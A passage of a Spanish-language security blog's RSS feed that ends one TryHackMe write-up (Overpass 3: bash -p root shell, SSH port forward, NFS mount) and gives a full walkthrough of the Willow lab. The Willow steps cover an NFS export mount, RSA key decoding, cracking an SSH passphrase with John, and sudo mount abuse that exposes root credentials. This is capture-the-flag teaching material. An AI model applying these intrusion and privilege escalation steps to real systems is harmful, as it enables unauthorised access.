&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass3/Screenshot_20210112_211344.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ya que tenemos acceso a la maquina con el usuario &lt;code&gt;James&lt;/code&gt; ejecutamos &lt;code&gt;bash -p&lt;/code&gt; para obtener una shell con el usuario root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass3/Screenshot_20210112_213155.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;nfs---update&#34;&gt;NFS - UPDATE&lt;/h2&gt;
&lt;p&gt;No era necesario obtener el puerto &lt;code&gt;111 y 20048&lt;/code&gt;, solo el puerto &lt;strong&gt;&lt;code&gt;2049&lt;/code&gt;&lt;/strong&gt; y montar directamente &lt;code&gt;localhost:/&lt;/code&gt; a la carpeta especificada.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#SSH - Puerto 2049&lt;/span&gt;
ssh -L 2049:127.0.0.1:2049 paradox@overpass.thm

&lt;span class=&#34;c1&#34;&gt;#Mount&lt;/span&gt;
sudo mount -t nfs localhost:/ /home/kali/thm/overpass3/jamesstuff/
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Links útiles:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/&#34;&gt;&lt;strong&gt;Linux Privilege Escalation using Misconfigured NFS&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.ibm.com/support/knowledgecenter/STXKQY_5.1.0/com.ibm.spectrum.scale.v5r10.doc/bl1adv_firewallforprotaccess.htm&#34;&gt;&lt;strong&gt;NFS access&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/overpass3/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/overpass3/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>nfs</category>
            
          
            
              <category>rpc</category>
            
          
            
              <category>rustbuster</category>
            
          
            
              <category>ftp</category>
            
          
            
              <category>chisel</category>
            
          
            
              <category>mount</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Willow</title>
        <link>https://sckull.github.io/posts/willow/</link>
        <pubDate>Thu, 12 Mar 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 12 Mar 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/willow/</guid>
        <description>Willow es una maquina de TryHackMe, encontramos un reto que nos permitio generar una clave privada encriptada a la cual encontramos la frase secreta con John lo que nos permitio obtener acceso por SSH.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Willow es una maquina de TryHackMe, encontramos un reto que nos permitio generar una clave privada encriptada a la cual encontramos la frase secreta con John lo que nos permitio obtener acceso por SSH. Encontramos credenciales al montar una particion, con ello logramos acceder como root.&lt;/p&gt;
&lt;h1 id=&#34;room&#34;&gt;Room&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;Titulo&lt;/strong&gt;&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;&lt;a href=&#34;https://tryhackme.com/room/willow&#34;&gt;Willow&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,AAABAAIAEBAAAAAAIAA1AwAAJgAAABgYAAAAACAA4wUAAFsDAACJUE5HDQoaCgAAAA1JSERSAAAAEAAAABAIBgAAAB/z/2EAAAL8SURBVHicTZLJbxtlGMZ/32xeZiZeYqdJDU5DQlISkrQ4KQiQClKUgpCAqlz6B3Hkygm4cAAJziBVFAoobdQSsrWQiNIiYjtO7Sae8T7j8cchMu5zew/PpucVUkrJM/C7Prt7W9z45TvefnOFpZdfQwiBQAAgpUQog1vrE6WUCCFY31rj828+xXEcGvUGs5Pz2ObQ/wZCiGf9EPIUCCEoPinwyWcfs755h7ARIZPOoKsh3l+9yvTkNOXjMmbE5sLsRVT11Fvrk4Mg4Nvvv+LOxhrOsUPNPeDR44fYls3Y2Bh2zGb7/u/c3Vrnw3euce3d62iqhtKPsrZxi539LWw7RqAEaIaC3/ZwjmvcvHWD1NAI585MsfTKJWqtOq12EwBFCEHba1F1q4SNMIpUGI6lGE1niMeTNNsNDktHfPn1F7S8BhEjjBW28LzOqQBA5bjM7Xu/cn9nm0IxT9cP8AIPKSUXZ3IsLSzz488/4AU+qqKz9/cDDkr/DlZ4Wq2w+ccG+aM8br2GkALTNAFBsVKkWjthLHOW3b1tstlxxp+foL++BuDUHAqlAt2gx4uT07SabQLfJ5A98vkDDFXHabjs7G8ykjxDbnGZC+dzgwp//bOP67rkFpbIZrLohkqj2aBcfoKuGKiqjhd4hKJRtIjOT7dvclgqDhJUq1UUoVI4PKB4VMAQBpmxLI/bj3AbNeLxOInhBI7rYEZsWlYbt+4OEmiqhhHS8fwuI+lRjGiYQilPz5fY1hAvzcximRZd3yNmx9E1nVanNRDwAw/LtDCjUSQSy7I5l52g0/DoNNuUKyUi0Qhd2cV1T6AniUajpxV6vYBUIkUqmSKVGKFSrTCcTDE7Ncfeb/vML85zefUtjk+eUm/WQBcITRAJR/qvDGdHM+QWl3luNMufDx/wwvgUH713nZ21XWbmZvhg9Sr3tu5Sb9YIGWEs02Juev5UQFEULr+6wqWF1xGKoNNpI4RCKpnGDNkkIsOcn5gjk86y8sYVQkYYTdWI2XEA/gMEukBhAEV0RwAAAABJRU5ErkJggolQTkcNChoKAAAADUlIRFIAAAAYAAAAGAgGAAAA4Hc9+AAABapJREFUeJyVk1tvHGcdxn8zO6edmZ2d2YPXduzaG5cYm9gxUZIGlXDIoSDRSpVAoEoF8QngCi74AtwgISE+AeKqFxyEqhAcERThFtO0aSDOwV2fT2uv197Zw8zs7uwMF5UKm9QIntv/+74/Pc//fYQ4jmNOUKfboeYe8bi0xOLSAj/83o9RZe2k458q6aRBuxPwhzu/5c4783gtj0a9zvrVVXTdYLQw9j8DxJMGD57eZ2n5Hxw1qoiKSCzAz37xU9JG+v9yIHxaRHsHO/zyVz9nZfsjHpeW0CSNK5e/QlAPSBkWhcEhXrv+OvnsAJWjfRRJxbYypMzUc4DnIvIDn4X379L0G1Sq+zjJDOWDMrdu3iQ/kmdjfZ3PTc7iNmp88eKXWHy4QMbM8s57C1y78grfefVNNFU7GVDaXGb+r3/k3oNF3LpLz+8RtAOShkZj1aXbDZmenEYQBGzL4WtXvsH8n29RyBV4+87vcNIOV7/wCqbxsZu+HexXy7z19q9xGzVGR8bI5XIoloKqK3TbXeIQlITK7dt/4vbdW3R7HSzFoXboMl4s8vmzFzmsHeK3/U/e/AQQhl0eLf8TOaFwemwCKSEhkEBJKNiWQ8pK0+2FuHWXlfVVNtc32N7eonpwyPVrN+iGXc5OzqAqKrqmPx9R5biCnXYIeyGVygG12jGanEROy7i1GsO5EbpRhziM0NMpZEniN79/ixdGTjMzM0PddakdH9PutqnVjzF0sx9Qb7p8+OgD3rv3N+IoplKtEIUxQ4UhjKER1jZWsa0Mg8YwdiZDu9dm+dEyXjfgjW++yYPlD4ijmNLGMus7a5waHO0H7Ff2WHx/gXJlD8tKE7R9vJaP12khCiJu3SWRSJDUdHpRj+JIkerOIbZts7Jd4uzULLt7u2SdHLX6UX9EcRzjtT0afgPXc2l6HrX6MQIC7aCNnbaxDAvf9ykHe/jlVUqrTymOTaBIMvN/uYmVtrh65Qbbe1toz+4giiM8v8XO3g6tloehm6iagp3KIAoJojAkm82ztrVK02sixiLddpetvU1Wt0q0gwBV0djd2GFqeprxU8VnAFHE7sE2m9sbOFaGwkCBifEXSUgSi/fepd6so8oqqqxSC2ok5SSCJOD5Pt24g5bUsNIWHz65z6PSQyaKZ553UNr4CN/zmZqbJpW08PwWy2tPEEUB0zRZWS8hSTKqoiJEIqIooOkaKgqikEBMJBgcyrG+vkbl8KAfIAoCdbcBCNRdl52dLZpek6bbYDA7zGRxCklQ2NzeQJVkemEP1dTRNZ265xIDpp6i0+miJlU8z+svWi+K6IUhacv6+B+7DYxkCs3UqQcN/n5/kXwuj6GY+IGPbumMj41TyA9iGRZRLyIhSmiahiRL1BrH/QDPa5EyLbRkEt8PGC4MY6ZMBgeGsG2bmJgnTx/Ta4eEYchXL19D15LoepIwDGl3fHKZHI6VIYoiojjqBzS9Jn7g0Q07DOQH6PbaNFsNqkdVBEHg2pdv4BgOUQSKpHDn7jx75V2aXhMv8AijHju7mxyUy0iSjK7rxMT/2YOIfG6AfG4AMU6gKCr5XIF6y0USJVp+C1VXEAKBhCwye36OnhhyfuYCsiKz9PQhkiajKwaVxgFWyup3EMcxpwojOJZDNpvlwtwlDMNAlmUuzF3iu9/6PlOfnSEhSGSzOX70g59w/uxFYmJmp8+RzWTQkwa6mUQQBUzDRED4twNBEEhIIoZpUMgOkjItgo5P02/wmdOTjA69wLdff4PH7z4hX8yQzw4wO3WOg6N9Op0OalLFsR1MI8Wl8y/x4vgzPUhbNtdf/jpnilNEUYShm9SbLmtbK1w6d5nB3DC25SBLChOjZxjKD6PMyPSiHqubKyS1JGMjReI4RpEVXpp7uR9gpxzslMOZ8SlO0lG1yv5+mUQoYZsOtukA/Nc7AP8Cb+h2HS1zxIMAAAAASUVORK5CYII=&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Descripción&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;What lies under the Willow Tree?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;60&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_thm&#34; style=&#34;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://tryhackme.com/p/MuirlandOracle&#34;&gt;MuirlandOracle&lt;/a&gt; &lt;img src=&#34;https://tryhackme-badges.s3.amazonaws.com/MuirlandOracle.png&#34; class=&#34;user_maker_thm&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
&lt;p&gt;Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Feb 28 14:00:08 2020 as: nmap -sV -p- --min-rate=1000 -o nmap_rate willow.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; willow.thm
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.19s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65531&lt;/span&gt; closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   open  http    Apache httpd 2.4.10 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
111/tcp  open  rpcbind 2-4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPC &lt;span class=&#34;c1&#34;&gt;#100000)&lt;/span&gt;
2049/tcp open  nfs     2-4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPC &lt;span class=&#34;c1&#34;&gt;#100003)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Feb 28 14:01:52 2020 -- 1 IP address (1 host up) scanned in 103.49 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/new_rom# gobuster dir -u http://willow.thm/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;user---willow&#34;&gt;USER - Willow&lt;/h1&gt;
&lt;h2 id=&#34;private-key&#34;&gt;PRIVATE KEY&lt;/h2&gt;
&lt;p&gt;En la pagina principal de willow encontramos una cadena en hexadecimal.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_182247.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos CyberChef para decodificar el contenido de esta cadena.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_182347.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Èncontramos un mensaje en el que indica que la clave privada de Willow esta encriptada - &lt;em&gt;Asumimos que willow es un usuario registrado en la maquina&lt;/em&gt;:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Hey Willow, here&#39;s your SSH Private key -- you know where the decryption key is!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Adjunto al mensaje, una lista de numeros.&lt;/p&gt;
&lt;h2 id=&#34;nfs&#34;&gt;NFS&lt;/h2&gt;
&lt;p&gt;En el puerto 2049 encontramos un punto de montaje el cual puede utilizar cualquiera (nobody:nogroup), utilizamos &lt;code&gt;mount&lt;/code&gt; para montar la carpeta permitida (&lt;code&gt;/var/failsafe&lt;/code&gt;).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/willow# showmount -e willow.thm
Export list &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; willow.thm:
/var/failsafe *
root@aoiri:~/tryhackme/willow# mkdir tmp_nfs
root@aoiri:~/tryhackme/willow# &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
/root/tryhackme/willow
root@aoiri:~/tryhackme/willow# mount -t nfs willow.thm:/var/failsafe /root/tryhackme/willow/tmp_nfs/
root@aoiri:~/tryhackme/willow# ls tmp_nfs/
rsa_keys
root@aoiri:~/tryhackme/willow# &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; tmp_nfs/
root@aoiri:~/tryhackme/willow/tmp_nfs# cat rsa_keys 
Public Key Pair: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;23, *****&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Private Key Pair: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;*****, *****&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@aoiri:~/tryhackme/willow/tmp_nfs# ls -lah
total 12K
drwxr--r-- &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; nobody nogroup 4.0K Jan &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; 10:31 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root   root    4.0K Feb &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 14:05 ..
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root      &lt;span class=&#34;m&#34;&gt;62&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; 10:31 rsa_keys
root@aoiri:~/tryhackme/willow/tmp_nfs#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El contenido del archivo que encontramos en la carpeta es &lt;code&gt;rsa_keys&lt;/code&gt; que contiene las claves para la clave publica y la clave privada.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/willow/tmp_nfs# cat rsa_keys 
Public Key Pair: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;23, *****&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Private Key Pair: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;*****, *****&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En este post &lt;a href=&#34;https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/&#34;&gt;&lt;strong&gt;RSA Encription&lt;/strong&gt;&lt;/a&gt; explica a la perfeccion como funcionan, encriptacion y desencriptacion de RSA. Para este reto escribi un pequeño script en python que por cada numero que encontramos en el mensaje, lo vamos a convertir a hexadecimal utilizando las claves (6&amp;mdash;7, 3&amp;mdash;7) del archivo &lt;code&gt;rsa_keys&lt;/code&gt;, en este caso vamos a utilizar el de la clave privada para poder conectarnos atraves del servicio SSH. Una vez hecho lo anterior convertimos a texto el mensaje (lista) en hexadecimal que obtuvimos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_184201.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos nuestro script y obtenemos nuestra clave privada:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_184228.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos la clave para iniciar sesion en el servicio de SSH pero esta esta protegida por una frase.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_184439.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos John para obtener el hash de la clave y obtener la frase.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_184541.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Una vez con la frase de nuestro archivo, iniciamos sesion en el servicio SSH y obtenemos nuestra shell con usuario Willow.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_184605.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos una imagen en la carpeta principal de Willow:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_184755.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;La codificamos a base64 y utilizamos nuevamente &lt;code&gt;CyberChef&lt;/code&gt; para renderizar nuestra imagen (podemos utilizar &lt;code&gt;scp&lt;/code&gt; btw), obtenemos nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_184932.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;Enumeramos los comandos que podemos ejecutar sin contraseña utilizando sudo &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que podemos utilizar &lt;code&gt;mount&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_185607.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Revisamos /mnt/ y encontramos la carpeta /creds que no contiene nada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_190214.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos el contenido de &lt;code&gt;/dev&lt;/code&gt; en donde se supone estan las &amp;ldquo;particiones&amp;rdquo; montadas, y podemos ver inmediatamente &lt;code&gt;hidden_backup&lt;/code&gt; lo cual no es muy comun de encontrar.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_190519.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ya que podemos utilizar &lt;code&gt;mount&lt;/code&gt; con sudo vamos a proceder a montar esta &amp;ldquo;particion&amp;rdquo; en &lt;code&gt;/mnt/creds&lt;/code&gt; (puede ser en cualquier otra carpeta a la que willow tenga acceso).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_191309.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos las credenciales del usuario root y willow, cambiamos al usuario root y dentro de su carpeta encontramos un mensaje en &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_191420.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;La nota nos indica que la flag &lt;strong&gt;root.txt&lt;/strong&gt; ya nos fue dada antes de que obtuvieramos una shell, recordemos que la primera flag la encontramos en la imagen, regresamos a la imagen que encontramos y extraemos su contenido con la contraseña de root, en donde podemos ver nuestra ultima flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_191723.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/willow/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/willow/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>nfs</category>
            
          
            
              <category>showmount</category>
            
          
            
              <category>steghide</category>
            
          
